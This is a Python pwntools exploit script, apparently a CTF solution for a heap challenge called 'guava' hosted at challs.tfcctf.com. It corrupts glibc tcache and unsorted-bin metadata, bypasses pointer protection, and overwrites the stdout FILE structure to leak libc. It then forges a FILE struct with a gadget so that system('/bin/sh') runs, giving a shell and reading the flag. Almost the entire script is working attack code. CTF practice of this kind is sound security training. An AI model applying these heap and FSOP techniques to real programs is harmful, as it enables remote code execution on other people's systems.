#!/usr/bin/env python3

from pwn import *

exe = ELF("./guava_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "critical"

def conn():
    if args.LOCAL:
        r = process([exe.path], aslr=False)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.tfcctf.com", 30482)
        # r = remote("localhost", 1337)

    return r

r = conn()

chunk_cnt = -1

def malloc(sz, data, offset=0):
    global chunk_cnt
    r.sendlineafter(b"*> ", b"1")
    r.sendlineafter(b"guavas: ", str(sz).encode())
    r.sendlineafter(b"guavset: ", str(offset).encode())
    r.sendafter(b"guavas: ", data)
    chunk_cnt += 1

    return chunk_cnt

def free(idx):
    r.sendlineafter(b"*> ", b"2")
    r.sendlineafter(b"no: ", str(idx).encode())

def main():
    mal_size = 0x88
    tcache_0x90 = []
    tcache_0x1b0 = []

    # allocations for filling tcache
    for i in range(7):
        tcache_0x90.append(malloc(0x88, b"A"*0x88))
        tcache_0x1b0.append(malloc(0x1a8, b"B"*0x1a8))
    
    # if (args.LOCAL):
    #     gdb.attach(r, '''heap bins
    #         heap chunks''')
    #     heap_leak = input("Enter heap leak: ")
    #     heap_leak = int(heap_leak, 16)
        # heap_leak = 0x9080
    heap_leak = 0x9080

    # set 0x10001 in tcache per thread struct
    free(malloc(0x3d8, b'GUAVA'))
    free(malloc(0x3e8, b'GUAVA'))

    # allocations for 2 unsorted bins which will be used for UAF
    malloc(0x18, b"GUARD 1")
    a1 = malloc(mal_size, b"A1" * (mal_size // 2))
    b1 = malloc(mal_size, b"B1" * (mal_size // 2))
    c1 = malloc(mal_size, b"C1" * (mal_size // 2))
    d1 = malloc(mal_size, b"D1" * (mal_size // 2))
    malloc(0x18, b"GUARD 2")
    a2 = malloc(mal_size, b"A2" * (mal_size // 2))
    b2 = malloc(mal_size, b"B2" * (mal_size // 2))
    c2 = malloc(mal_size, b"C2" * (mal_size // 2))
    d2 = malloc(mal_size, b"D2" * (mal_size // 2))
    malloc(0x18, b"GUARD 3")

    # fill up 0x90 tcache
    for i in range(7):
        free(tcache_0x90[i])

    # create unsorted bins
    free(a1)
    free(b1)
    free(c1)

    free(a2)
    free(b2)
    free(c2)

    # overwrite c1 and c2 size to 0x21 and 0x31
    unsorted2 = malloc(0x1a8, b'1' * 0x118 + p64(0x31))
    unsorted1 = malloc(0x1a8, b'1' * 0x118 + p64(0x21))

    # free c1, c2 and place them in tcache
    free(c1)
    free(c2)

    # free unsorted bins
    free(unsorted2)
    free(unsorted1)

    # do the same thing but for b1 and b2 with sizes 0xe1 and 0xf1(these will be used to edit unsorted bin fd and bk)
    unsorted1 = malloc(0x1a8, b'1' * mal_size + p64(0xe1))
    unsorted2 = malloc(0x1a8, b'2' * mal_size + p64(0xf1))
    
    # fill up tcache
    for i in range(7):
        free(tcache_0x1b0[i])

    # free b1 and b2
    free(b1)
    free(b2)

    # make unsorted bin chunks fit under tcache chunks
    free(unsorted1)
    free(d1)

    malloc(0x38, b'X')
    malloc(0x48, b'X')
    malloc(0x38, b'X')
    malloc(0x58, b'X')

    unsorted_f1 = malloc(0x108, b'Y'*mal_size)

    free(unsorted2)
    free(d2)

    malloc(0x38, b'X')
    malloc(0x48, b'X')
    malloc(0x38, b'X')
    malloc(0x58, b'X')

    unsorted_f2 = malloc(0x108, b'Z'*mal_size)

    # alloc unsorted bin which will be hijacked
    unsorted_f3 = malloc(0x108, b'W'*mal_size)

    tcache_0x110 = []
    for i in range(8):
        tcache_0x110.append(malloc(0x108, b"0x110"))

    for i in tcache_0x110:
        free(i)
    
    # set up padding for prev_size
    for i in range(36):
        malloc(0x5f8, b'Z'*0x5f8)
    malloc(0x5f8, b'A'*0xf0+p64(0x10000)+p64(0x20))

    free(unsorted_f1)
    free(unsorted_f3)
    free(unsorted_f2)

    # edit fd and bk of unsorted_f3
    malloc(0xd8, p16(heap_leak), 0xa8) # bk
    malloc(0xe8, p16(heap_leak), 0xa0) # fd

    # Overwrite lsb of 0x3d8
    malloc(0x248, p16(heap_leak - 0x70), 0x1e0)

    # Allocate at the management chunk!
    mgmt = malloc(0x3d8, p8(0)*0x288)

    # overwrite lsb of a leftover libc address on the heap to point to stdout file struct
    aux1 = malloc(0x600, b"\x00")
    aux2 = malloc(0x600, b"\x00")
    aux3 = malloc(0x600, b"\x00")
    aux4 = malloc(0x600, p16(0x45c0), 0x540)

    free(aux4)
    free(aux3)
    free(aux2)
    free(aux1)

    # # bypass protect ptr
    l1 = malloc(0x18, b'A'*0x18)
    l2 = malloc(0x18, b'B'*0x18)

    l3 = malloc(0x188, b'A'*0x188)
    l4 = malloc(0x188, b'B'*0x188)

    free(l1)
    free(l2)
    free(l3)
    free(l4)

    free(mgmt)

    # edit lsb of 0x20 tcache to chunk with libc pointer
    malloc(0x288, p64(0x191)+p16(heap_leak + 0x19d0), 0x78)

    # index the encrypted pointer into tcache
    malloc(0x18, b'\x00' * 8, 8)
    # Free the per-thread cache pointer again so we can use it to overwrite LSB of t-cache entries again
    free(mgmt)

    # Fake a chunk and make the LSB of 0x20 t-cache point to the WIN condition pointer
    malloc(0x288, p16(heap_leak + 0x10), 0x138)

    # malloc twice
    malloc(0x188, b'bruh')

    # fix broken lsb
    free(mgmt)
    malloc(0x288, p16(0x45c0 - 0x20), 0x138)
    
    # put chunk over stdout to get libc leak
    stdout = malloc(0x188, p64(0xfbad1887)+p64(0)*3 + p16(0x45c0), 0x20)

    # get libc leak
    r.recv(0x20)
    libc_leak = u64(r.recv(8))
    log.info(f"libc leak: {hex(libc_leak)}")
    libc.address = libc_leak - 0x2045c0
    log.success(f"libc base: {hex(libc.address)}")

    # use fsop to get rce
    free(mgmt)
    malloc(0x288, b"\x02", 0x26 + 8)

    free(mgmt)
    malloc(0x288, p64(libc.sym['_IO_2_1_stdout_'] - 0x20), 0x138)

    # win with fsop on stdout
    stdout_lock = libc.address + 0x205710   # _IO_stdfile_1_lock  (symbol not exported)(that's a lie)
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
    # our gadget
    gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    # malloc over stdout
    malloc(0x188, bytes(fake), 0x20)


    # r.interactive()
    # r.sendline(b"cat flag.txt")
    f = open("flag.txt", "w")
    f.write("caca")
    f.close()

    r.sendline(b"cat flag.txt")
    r.interactive()


if __name__ == "__main__":
    main()
